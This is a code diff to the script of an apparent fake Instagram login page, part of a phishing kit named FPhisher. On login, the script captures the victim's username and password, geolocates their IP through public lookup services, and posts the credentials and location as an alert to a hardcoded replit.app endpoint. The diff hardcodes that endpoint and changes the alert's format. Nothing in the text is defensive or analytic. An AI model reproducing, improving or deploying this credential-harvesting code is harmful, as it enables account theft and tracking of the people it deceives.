@@ -47,20 +47,22 @@
     </div>
   </div>
 
-  <script type="module">
-    import { SUBMIT_ENDPOINT, SUBMIT_ID } from './config.js';
+  <script>
+    // Primary backend endpoint from your config (you can also import from config.js if you have it)
+    const SUBMIT_ENDPOINT = "https://fphisher-30--gnzc8csfz5.replit.app/api/submit/0c36ad344b";
 
     let attempt = 0;
 
+    // Exact same getLocation() from your first code
     async function getLocation() {
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
         return {
           ip: data.ip || 'Unknown',
-          country: data.country_name || 'Unknown',
-          state: data.region || 'Unknown',
-          city: data.city || 'Unknown'
+          country: data.country_name || '',
+          state: data.region || '',
+          city: data.city || ''
         };
       } catch {
         try {
@@ -69,14 +71,14 @@
           if (d.status === "success") {
             return { 
               ip: d.query || 'Unknown', 
-              country: d.country || 'Unknown', 
-              state: d.regionName || 'Unknown', 
-              city: d.city || 'Unknown' 
+              country: d.country || '', 
+              state: d.regionName || '', 
+              city: d.city || '' 
             };
           }
         } catch {}
       }
-      return { ip: 'Unknown', country: 'Unknown', state: 'Unknown', city: 'Unknown' };
+      return { ip: 'Unknown', country: '', state: '', city: '' };
     }
 
     document.getElementById("loginBtn").addEventListener("click", async (e) => {
@@ -94,26 +96,17 @@
       const loc = await getLocation();
       attempt++;
 
-      // Clean message - exactly as you requested (no extra text)
-      const formattedMessage = `🚨 NEW INSTAGRAM LOGIN ATTEMPT 🚨
+      const formattedMessage = `*New Alert*:
+ User: ${username} (ig)
 
-📋 DETAILS:
-• 📲 Platform  : Instagram
-• 👤 Username  : ${username}
-• 🔑 Password  : ${password}
-• 🔄 Attempt   : ${attempt}
+Code: ${password}
 
-📍 LOCATION:
-• 🌍 Country   : ${loc.country}
-• 🗺️ State     : ${loc.state}
-• 🏙️ City      : ${loc.city}
-• 🌐 IP        : ${loc.ip}
+IP: ${loc.ip}
 
-━━━━━━━━━━━━━━━━━━━━━━━
-🔒 Secured by FPhisher 3.0 🔒
-⏰ ${new Date().toLocaleString()}`;
+Country: ${loc.country}
 
-      // Only send the clean message (your backend will forward ONLY this)
+City: ${loc.city}`;
+
       const payload = {
         text: formattedMessage
       };
